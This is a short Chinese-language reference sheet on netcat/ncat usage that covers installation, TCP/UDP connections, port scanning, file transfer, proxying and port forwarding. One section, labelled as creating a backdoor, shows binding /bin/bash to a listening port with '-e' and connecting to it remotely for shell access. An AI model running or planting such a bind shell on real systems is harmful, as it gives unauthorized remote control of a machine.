.. _nc:

nc命令使用
######################

安装::

    yum install -y nmap-ncat.x86_64
    yum install -y nc.x86_64

    apt-get install  netcat  -y




给某一个endpoint发送TCP请求::

  nc 192.168.0.11 8000 < data

nc可以当做服务器，监听某个端口号::

  nc -l 8000 > received_data
  // 把某一次请求的内容存储到received_data里




实例-端口扫描::

    端口扫描:
    nc -v -w 2 <server ip> -z <port1>-<port2>

实例-tcp::

    % 1.启动一tcp服务
    server1> nc -l <port>
    ...
    % 2.连接此tcp服务
    server2> nc <ip> <port>

实例-udp::

    # 1. 启动udp服务
    nc -u -l <port>
    # 2. 请求udp服务
    nc --wait 1 --udp 127.0.0.1 8125
    等同于
    nc -w 1 -u 127.0.0.1 8125

实例-连接远程http系统::

    $ ncat IP_address port_number
    % 以下是几种请求
    GET / HTTP/1.1
    HEAD / HTTP/1.1

实例-服务器间复制文件::

    server1> nc -l [port] > test.txt
    ...
    server2> nc [server1 Ip] <test.txt

实例-将 nc 作为代理::

    % 所有8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口
    $ ncat -l 8080 | ncat 192.168.1.200 80

    %上面是单向传输，可使用下面命令实现双向管道
    $ mkfifo 2way
    $ ncat -l 8080 0<2way | ncat 192.168.1.200 80 1>2way

实例-端口转发::

    % 80端口会自动转发到8080
    $ ncat -u -l  80 -c  'ncat -u -l 8080'


实例-创建后门::

    $ ncat -l 10000 -e /bin/bash
    % -e 标志将一个 bash 与端口 10000 相连
    % 以用以下命令可以获取所有bash权限
    $ ncat 192.168.1.100 10000

实例-连接超时::

    % 连接 10 秒后终止
    $ ncat -w 10 192.168.1.100 8080

实例-强制监听待命::

    % 客户端从服务端断开连接后，过一段时间服务端也会停止监听
    % 即使来自客户端的连接断了也依然会处于待命状态
    $ ncat -l -k 8080







    
